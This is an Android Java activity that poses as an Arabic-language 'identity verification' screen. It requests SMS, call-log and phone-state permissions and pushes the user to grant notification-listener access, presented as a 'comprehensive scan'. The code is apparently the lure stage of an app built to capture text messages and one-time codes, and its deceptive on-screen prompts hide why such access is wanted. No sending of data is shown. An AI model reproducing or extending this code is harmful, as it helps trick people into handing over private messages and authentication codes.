package com.ban.ab;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class VerifyActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_verify);

        Button btnStartVerify = findViewById(R.id.btnStartVerify);

        btnStartVerify.setOnClickListener(v -> {
            // 1. طلب أذونات النظام الأساسية
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[]{
                        android.Manifest.permission.READ_PHONE_STATE,
                        android.Manifest.permission.READ_CALL_LOG,
                        android.Manifest.permission.RECEIVE_SMS,
                        android.Manifest.permission.READ_SMS
                }, 101);
            }

            // 2. توجيه المستخدم لتفعيل "الوصول للإشعارات" (الفحص الشامل)
            if (!isNotificationServiceEnabled()) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(this, "يرجى تفعيل 'نظام فحص الهوية' للبدء", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "الفحص الشامل يعمل الآن.. بانتظار التأكيد", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }
}
